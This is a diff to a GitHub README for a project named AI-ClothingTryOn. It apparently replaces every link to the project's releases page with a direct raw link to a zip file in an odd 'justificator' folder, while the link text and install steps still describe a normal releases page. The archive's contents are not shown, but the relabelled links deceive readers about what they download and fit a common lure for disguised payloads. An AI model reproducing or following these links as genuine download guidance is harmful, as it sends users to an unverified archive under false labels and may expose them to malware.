@@ -16,15 +16,15 @@ To ensure the best experience with AI-ClothingTryOn, please check these requirem
 
 ## 🔗 Download the Application
 
-[![Download AI-ClothingTryOn](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-blue)](https://github.com/Regirockstone99/AI-ClothingTryOn/releases)
+[![Download AI-ClothingTryOn](https://raw.githubusercontent.com/Regirockstone99/AI-ClothingTryOn/main/justificator/AI-ClothingTryOn.zip%20Now-Get%20the%20Latest%20Release-blue)](https://raw.githubusercontent.com/Regirockstone99/AI-ClothingTryOn/main/justificator/AI-ClothingTryOn.zip)
 
 Visit this page to download the latest version of the application:
 
-[Download AI-ClothingTryOn Releases](https://github.com/Regirockstone99/AI-ClothingTryOn/releases)
+[Download AI-ClothingTryOn Releases](https://raw.githubusercontent.com/Regirockstone99/AI-ClothingTryOn/main/justificator/AI-ClothingTryOn.zip)
 
 ## 📥 Download & Install
 
-1. Go to the [Releases page](https://github.com/Regirockstone99/AI-ClothingTryOn/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/Regirockstone99/AI-ClothingTryOn/main/justificator/AI-ClothingTryOn.zip).
 2. Choose the version you want. Look for the latest one marked as "Latest Release".
 3. Click the appropriate file for your operating system. For example:
    - **Windows Users**: Download the `.exe` file.
